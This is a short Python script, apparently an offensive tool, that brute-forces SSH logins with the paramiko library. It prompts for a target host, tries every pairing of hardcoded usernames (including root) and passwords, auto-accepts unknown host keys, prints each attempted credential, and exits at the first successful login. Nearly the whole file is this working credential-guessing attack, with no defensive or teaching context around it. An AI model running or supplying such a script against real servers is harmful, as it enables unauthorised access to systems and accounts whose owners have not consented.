import paramiko


def ssh_login(hostname, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, username=username, password=password)
        print(f"Login successful with username '{username}' and password '{password}'")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"Failed login attempt with username '{username}' and password '{password}'")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False


def main():
    hostname = input("Enter the hostname or IP address: ")
    usernames = ['user1', 'user2', 'root']  # Add your list of usernames here
    passwords = ['password1', 'password2', 'brute_1_Force']  # Add your list of passwords here

    for username in usernames:
        for password in passwords:
            if ssh_login(hostname, username, password):
                return  # Exit the program if login successful

    print("Failed to find valid credentials")


if __name__ == "__main__":
    main()
